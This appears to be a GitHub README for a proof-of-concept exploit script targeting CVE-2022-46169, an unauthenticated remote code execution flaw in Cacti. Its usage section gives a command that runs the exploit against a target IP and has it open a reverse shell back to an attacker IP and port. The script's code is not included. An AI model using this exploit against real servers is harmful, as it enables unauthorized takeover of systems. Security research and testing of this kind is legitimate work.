# CVE-2022-46169

This repository contains a Proof of Concept (PoC) for CVE-2022-46169 - Unauthenticated RCE on Cacti <= 1.2.22. You can read more about the vulnerability [here](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/). The script adds a reverse shell handler and is based on the code written by sAsPeCt488. You can view the original code [here](https://github.com/sAsPeCt488/CVE-2022-46169/blob/main/CVE-2022-46169.py).

### Usage
```
python3 CVE-2022-46169.py -t 10.129.211.250 -i 10.10.14.72 -p 4444

Arguments:
-t : Target IP address 
-i : Attacker system IP Address
-p : Port for reverse shell
```
![image](https://user-images.githubusercontent.com/38681779/235741029-614e629c-3bd3-42db-8327-f5a6c2499ac6.png)

# Credits
* Steven Seeley (mr_me) for discovering the exploit
